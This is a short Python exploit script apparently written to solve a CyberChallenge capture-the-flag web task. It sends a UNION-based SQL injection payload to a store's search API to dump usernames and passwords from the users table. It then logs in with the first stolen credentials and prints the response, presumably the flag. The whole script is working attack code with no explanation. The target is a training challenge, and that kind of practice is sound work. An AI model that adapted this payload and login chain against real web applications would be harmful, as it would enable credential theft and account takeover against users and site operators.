import requests
from urllib.parse import quote
import json

URL = "http://store98.challs.cyberchallenge.it/api/v1/"

s = requests.Session()
s.cookies
def csrf(p):
    s = p.get(URL + "csrf")
    return p

def search(p, payload):
    p = csrf(p)
    payload = quote(payload)
    return p.get(URL + "search?name=" + payload).json()

def login(p, payload):
    p = csrf(p)
    return p.post(URL + "session", data=payload)


def users(p):
    print(p)


payload = "\\' UNION SELECT 1,2, username AS name, password AS description, \"ciao\", \"ciao1\" FROM users -- "
resp = search(s, payload)
payload = {"username": resp[0]["name"], "password": resp[0]["description"]}
# print(payload)
payload = json.dumps(payload)
s = csrf(s)
resp = s.post(URL + "session", data=payload)
print(resp.content.decode().split("\"")[-2])



# for i, j in resp:
    # print(i, j)